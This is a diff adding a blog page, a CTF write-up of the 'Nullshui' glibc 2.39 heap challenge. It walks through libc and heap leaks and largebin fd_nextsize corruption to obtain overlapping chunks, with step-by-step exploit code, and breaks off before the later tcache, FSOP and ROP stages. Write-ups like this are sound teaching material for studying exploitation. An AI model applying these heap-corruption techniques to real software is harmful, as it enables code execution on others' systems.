@@ -1,0 +1,914 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="Nullshui - Omni CTF 2026\rOverview\rFinally, after procrastinating for months, I decided to actually write a writeup for this challenge. This was one of the first challenges I solved where I had to chain multiple heap primitives together to eventually get code execution, so I thought it deserved a proper writeup.\nAt first glance, this challenge doesn&rsquo;t look particularly exciting.\nWe have a fairly standard heap interface: allocate, free, view, and one operation that lets us zero a 16 byte aligned qword in the heap and we can only use it once.\n">
+<title>OmniCTF 2026 - Nullshui</title>
+
+<link rel='canonical' href='https://velobobo.github.io/blog/post/omni-2026-nullshui/'>
+
+<link rel="stylesheet" href="/blog/scss/style.min.cfa5b1b0e78d61c00a14173992a1f3fa3b5c1b9fa34d023de959af564e7b19dd.css"><meta property='og:title' content="OmniCTF 2026 - Nullshui">
+<meta property='og:description' content="Nullshui - Omni CTF 2026\rOverview\rFinally, after procrastinating for months, I decided to actually write a writeup for this challenge. This was one of the first challenges I solved where I had to chain multiple heap primitives together to eventually get code execution, so I thought it deserved a proper writeup.\nAt first glance, this challenge doesn&rsquo;t look particularly exciting.\nWe have a fairly standard heap interface: allocate, free, view, and one operation that lets us zero a 16 byte aligned qword in the heap and we can only use it once.\n">
+<meta property='og:url' content='https://velobobo.github.io/blog/post/omni-2026-nullshui/'>
+<meta property='og:site_name' content='Velobobo&#39;s Blog'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='heap' /><meta property='article:tag' content='fsop' /><meta property='article:tag' content='ctf' /><meta property='article:published_time' content='2026-09-10T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2026-09-10T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="OmniCTF 2026 - Nullshui">
+<meta name="twitter:description" content="Nullshui - Omni CTF 2026\rOverview\rFinally, after procrastinating for months, I decided to actually write a writeup for this challenge. This was one of the first challenges I solved where I had to chain multiple heap primitives together to eventually get code execution, so I thought it deserved a proper writeup.\nAt first glance, this challenge doesn&rsquo;t look particularly exciting.\nWe have a fairly standard heap interface: allocate, free, view, and one operation that lets us zero a 16 byte aligned qword in the heap and we can only use it once.\n">
+    <link rel="shortcut icon" href="/avatar-favicon.png" />
+
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "light");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/blog/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/blog/avatar_hu_d31f3887c3eab1b2.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+                    <span class="emoji">🔒</span>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/blog">Velobobo&#39;s Blog</a></h1>
+            <h2 class="site-description">Cybersecurity Enthusiast | Pwn</h2>
+        </div>
+    </header><ol class="menu-social">
+            
+                <li>
+                    <a 
+                        href='https://github.com/Velobobo'
+                        target="_blank"
+                        title="GitHub"
+                        rel="me"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+        <li >
+            <a href='/blog/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/ctfs/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-target"><circle cx="12" cy="12" r="10"></circle><circle cx="12" cy="12" r="6"></circle><circle cx="12" cy="12" r="2"></circle></svg>
+                
+                <span>CTFs</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+        <li >
+            <a href='/blog/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+        <li class="menu-bottom-section">
+            <ol class="menu">
+
+                
+                    <li id="dark-mode-toggle">
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                        <span>Dark Mode</span>
+                    </li>
+                
+            </ol>
+        </li>
+    </ol>
+</aside>
+
+    <aside class="sidebar right-sidebar sticky">
+        
+            
+                
+    <section class="widget archives">
+        <div class="widget-icon">
+            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-hash" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <line x1="5" y1="9" x2="19" y2="9" />
+  <line x1="5" y1="15" x2="19" y2="15" />
+  <line x1="11" y1="4" x2="7" y2="20" />
+  <line x1="17" y1="4" x2="13" y2="20" />
+</svg>
+
+
+
+        </div>
+        <h2 class="widget-title section-title">Table of contents</h2>
+        
+        <div class="widget--toc">
+            <nav id="TableOfContents">
+  <ol>
+    <li><a href="#overview">Overview</a></li>
+    <li><a href="#heap-grooming-and-getting-leaks">Heap grooming and getting leaks</a></li>
+    <li><a href="#largebin-corruption">Largebin Corruption</a></li>
+    <li><a href="#overlapping-chunks--tcache-poisoning">Overlapping chunks &amp; Tcache Poisoning</a></li>
+    <li><a href="#fsop---house-of-apple-2--setcontext--rop">FSOP - House of Apple 2 | setcontext | ROP</a></li>
+    <li><a href="#end">END</a></li>
+  </ol>
+</nav>
+        </div>
+    </section>
+
+            
+        
+    </aside>
+
+
+            <main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/blog/categories/pwn/" style="background-color: #2a9d8f; color: #fff;">
+                pwn
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/blog/post/omni-2026-nullshui/">OmniCTF 2026 - Nullshui</a>
+        </h2>
+    
+        
+    </div>
+
+    
+    
+    
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Sep 10, 2026</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    9 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+
+</header>
+
+    <section class="article-content">
+    
+    
+    <h1 id="nullshui---omni-ctf-2026">Nullshui - Omni CTF 2026
+</h1><h2 id="overview">Overview
+</h2><p>Finally, after procrastinating for months, I decided to actually write a writeup for this challenge. This was one of the first challenges I solved where I had to chain multiple heap primitives together to eventually get code execution, so I thought it deserved a proper writeup.</p>
+<p>At first glance, this challenge doesn&rsquo;t look particularly exciting.<br>
+We have a fairly standard heap interface: allocate, free, view, and one operation that lets us zero a 16 byte aligned qword in the heap and we can only use it once.</p>
+<p>you can grab the challenge files from <a class="link" href="https://github.com/OmniCTF/nullshui"  target="_blank" rel="noopener"
+    >here</a></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="mf">1.</span> <span class="n">alloc</span>
+</span></span><span class="line"><span class="cl"><span class="mf">2.</span> <span class="n">free</span>
+</span></span><span class="line"><span class="cl"><span class="mf">3.</span> <span class="n">view</span>
+</span></span><span class="line"><span class="cl"><span class="mf">4.</span> <span class="n">zero</span>
+</span></span><span class="line"><span class="cl"><span class="mf">5.</span> <span class="n">exit</span>
+</span></span><span class="line"><span class="cl"><span class="o">&gt;</span> 
+</span></span></code></pre></div><p>The binary is about as hardened as you would expect: Full RELRO , NX , PIE , Stack Canary , glibc 2.39 , seccomp</p>
+<p>The seccomp filter blocks execve and execveat, so even if we eventually get control of RIP, the usual system(&quot;/bin/sh&quot;) route isn&rsquo;t going to work.<br>
+There is also no obvious UAF that would let us immediately turn the heap primitives into a tcache poisoning attack. So we have to build the exploit piece by piece and somehow implement an ROP to read the flag file.<br>
+The interesting primitive here is the one-time heap NULL write. On its own, it doesn&rsquo;t look particularly powerful. But it turns out it kinda is , This is where largebins come into the picture.</p>
+<p>The final exploit chains together several different ideas:</p>
+<p>libc leak , heap leak<br>
+↓<br>
+largebin metadata corruption<br>
+↓<br>
+overlapping chunks<br>
+↓<br>
+tcache poisoning<br>
+↓<br>
+<code>_IO_2_1_stdout_</code> corruption<br>
+↓<br>
+setcontext<br>
+↓<br>
+stack pivot<br>
+↓<br>
+ROP<br>
+↓<br>
+read flag</p>
+<p>lets go through all this step by step</p>
+<h2 id="heap-grooming-and-getting-leaks">Heap grooming and getting leaks
+</h2><p>Now that we know what primitives we have, the first thing we need is information about where everything actually lives.<br>
+Since PIE and ASLR are enabled, we&rsquo;ll eventually need both a libc leak and a heap leak.</p>
+<p>I start by allocating the following chunks</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x410</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;A&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;P&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">2</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Guard&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Q&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">4</span><span class="p">,</span> <span class="mh">0x100</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;Guard&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">7</span><span class="p">,</span> <span class="mh">0x400</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;F&#34;</span><span class="p">)</span>
+</span></span></code></pre></div><p>The two guard chunks aren&rsquo;t there just for decoration. When I eventually free P and Q, I don&rsquo;t want them to merge with their neighbours through heap consolidation, so the guards keep the chunks isolated.</p>
+<p>There&rsquo;s another important detail here, all chunks except F have a user-requested size larger than the maximum tcache request (0x408). Therefore, when freed, <code>P</code> and <code>Q</code> won&rsquo;t end up in tcache. This is exactly what I want because I need them to reach the unsorted bin and eventually the largebin.</p>
+<p><code>F</code>, on the other hand, is intentionally 0x400. I&rsquo;ll leave that one alone for now , it will become useful later when we start messing with tcache.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">5</span><span class="p">,</span> <span class="mh">0x1000</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;sort chunks in largebin&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Freeing <code>P</code> and <code>Q</code> initially puts them into the unsorted bin.<br>
+The large allocation forces malloc to process the unsorted bin. Since P and Q are too large for the smallbins, they are sorted into the appropriate largebin.<br>
+This is useful because a freed largebin chunk contains considerably more interesting metadata than an allocated chunk.</p>
+<p>A largebin chunk looks roughly like:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">prev</span><span class="o">-</span><span class="n">size</span> <span class="o">|</span> <span class="n">size</span> <span class="o">|</span> <span class="n">fd</span> <span class="o">|</span> <span class="n">bk</span> <span class="o">|</span> <span class="n">fdnextsize</span> <span class="o">|</span> <span class="n">bknextsize</span>
+</span></span></code></pre></div><p>These fields form a double linked list with the large-bin as a head pointer , and as the bin head lives in the libc this gives us the required leaks</p>
+<p>largebin_head &ndash;&gt; Q &ndash;&gt; P &ndash;&gt; largebin_head</p>
+<figure><img src="/blog/post/omni-2026-nullshui/gdb_output1.png"
+    alt="img" width="800">
+</figure>
+
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">P</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">largebin_head</span> 
+</span></span><span class="line"><span class="cl"><span class="n">P</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">Q</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Q</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">P</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Q</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">largebin_head</span>
+</span></span></code></pre></div><p>we can now allocate these chunks and leak the metadata and calculate the libc and heap base</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">3</span><span class="p">,</span> <span class="mh">0x520</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="c1"># alloc Q </span>
+</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">8</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0x203f50</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>         <span class="c1"># free Q</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">9</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;put Q in largebin&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>    <span class="c1"># alloc P</span>
+</span></span><span class="line"><span class="cl"><span class="n">view</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">heap_base</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">()[</span><span class="mi">16</span><span class="p">:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s1">&#39;</span><span class="se">\\</span><span class="s1">x00&#39;</span><span class="p">))</span><span class="o">-</span><span class="mh">0xcd0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>         <span class="c1"># free P</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span> <span class="mh">0x600</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;put P in largebin&#34;</span><span class="p">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="largebin-corruption">Largebin Corruption
+</h2><p>We now have everything needed to start exploiting the allocator. But before touching <code>zero()</code>, we need to understand one slightly unusual part of largebins: the <code>fd_nextsize / bk_nextsize</code> pointers.</p>
+<p>Apart from the usual doubly linked list using fd,bk , the largebins also maintains another doubly linked list using fdnextsize,bknextsize which is used to skip between chunks of same size and directly move along the chunks of different size , more precisely it forms a size-ordered chain which allows malloc to efficiently search through chunks of different sizes instead of blindly walking every chunk in the bin. When chunks are inserted into largebins from unsorted bins , the chunks are added in a sorted order. Following the fdnextsize ptr we get to chunks of smaller sizes.</p>
+<p>In our case, Q is larger than P, so following <code>Q-&gt;fd_nextsize</code> eventually leads us towards the smaller chunk P.</p>
+<p>The doubly-linkedlist for (fd,bk) pair is like <code>binhead --&gt; Q--&gt;P--&gt;binhead</code> and for (fdnextsize,bknextsize) pair is like <code>Q--&gt;P</code></p>
+<p>Now what happens if we use the heap NULL write primitive to null out this <code>P-&gt;fdnextsize</code> and remove chunk <code>P</code> from largebin by allocating it?</p>
+<p>When malloc takes a chunk out of a bin, it eventually calls <code>unlink_chunk()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="nf">unlink_chunk</span> <span class="p">(</span><span class="n">mstate</span> <span class="n">av</span><span class="p">,</span> <span class="n">mchunkptr</span> <span class="n">p</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="k">if</span> <span class="p">(</span><span class="nf">__builtin_expect</span> <span class="p">(</span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">!=</span> <span class="n">p</span> <span class="o">||</span> <span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">!=</span> <span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">    <span class="nf">malloc_printerr</span> <span class="p">(</span><span class="s">&#34;corrupted double-linked list&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// unlink mechanism on (fd,bk) doubly-linked list
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="n">fd</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="n">bk</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="n">bk</span><span class="o">-&gt;</span><span class="n">fd</span> <span class="o">=</span> <span class="n">fd</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nf">in_smallbin_range</span> <span class="p">(</span><span class="nf">chunksize_nomask</span> <span class="p">(</span><span class="n">p</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="n">p</span><span class="o">-&gt;</span><span class="n">fd_nextsize</span> <span class="o">!=</span> <span class="nb">NULL</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// unlink mechanism on (fdnextsize,bknextsize) doubly-linked list
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The interesting detail is the condition: <code>p-&gt;fd_nextsize != NULL</code><br>
+If <code>P-&gt;fd_nextsize</code> is a valid pointer, glibc performs the normal <code>fd_nextsize / bk_nextsize</code> unlinking as well.<br>
+But we have just changed it to NULL.</p>
+<p>So when <code>unlink_chunk(P)</code> runs, glibc only unlinks the chunk from the (fd,bk) list but not from (fdnextsize,bknextsize) list
+so after <code>unlink_chunk</code> is called on chunk <code>P</code> , Q&rsquo;s fdnextsize still points to P. the largebin state is like this</p>
+<p>(fd,bk) : <code>binhead--&gt;Q--&gt;binhead</code><br>
+(fdnextsize,bknextsize) : <code>Q--&gt;P</code></p>
+<p>Now if we again try to alloc another <code>0x500</code> chunk , the request goes to largebin and it checks the size of chunk at head which is <code>Q</code> and sees the requested size is smaller so it walks through <code>Q-&gt;fdnextsize</code> and as it was still pointing to <code>P</code> the allocator thinks it found the required chunk and returns the chunk <code>P</code> to us. This results in us having the address of chunk <code>P</code> in two different slots.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span><span class="lnt">8
+</span><span class="lnt">9
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">p_user</span><span class="o">=</span><span class="n">heap_base</span><span class="o">+</span><span class="mh">0x6c0</span>
+</span></span><span class="line"><span class="cl"><span class="n">p_header</span><span class="o">=</span><span class="n">p_user</span><span class="o">-</span><span class="mh">0x10</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">zero</span><span class="p">((</span><span class="n">p_user</span><span class="o">+</span><span class="mh">0x10</span><span class="o">-</span><span class="n">heap_base</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">)</span>     <span class="c1"># zero out P-&gt;fdnextsize</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">p_header</span><span class="p">)</span> <span class="o">*</span> <span class="mi">2</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span> <span class="o">+</span> <span class="sa">b</span><span class="s2">&#34;P1&#34;</span><span class="p">)</span> <span class="c1"># alloc P</span>
+</span></span><span class="line"><span class="cl"><span class="n">alloc</span><span class="p">(</span><span class="mi">6</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s2">&#34;P2&#34;</span><span class="p">)</span> <span class="c1"># Get same chunk P allocated</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="c1"># free P</span>
+</span></span><span class="line"><span class="cl"><span class="n">free</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="c1"># consolidate 0,1  merging A,P</span>
+</span></span></code></pre></td></tr></table>
+</div>
